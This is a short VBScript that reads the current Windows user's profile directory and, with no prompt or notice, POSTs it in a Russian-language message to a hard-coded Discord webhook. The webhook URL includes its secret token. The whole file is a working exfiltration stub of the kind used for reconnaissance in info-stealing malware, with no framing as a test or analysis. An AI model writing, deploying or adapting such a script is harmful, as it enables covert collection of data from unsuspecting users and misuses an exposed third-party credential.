Set objShell = CreateObject("WScript.Shell")
strUserProfile = objShell.ExpandEnvironmentStrings("%UserProfile%")
strMessage = "Директория текущего пользователя: " & strUserProfile

strWebhookURL = "https://discord.com/api/webhooks/1229488110748831815/AOUFdoIL3ckqqsHfJrLmL7GjKDCX341XowAzdbymN5k3VL6vR3gEPRl_vGNHWfGIWCqJ"

Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")

strJSON = "{""content"": """ & strMessage & """}"

objHTTP.Open "POST", strWebhookURL, False
objHTTP.setRequestHeader "Content-Type", "application/json"
objHTTP.Send strJSON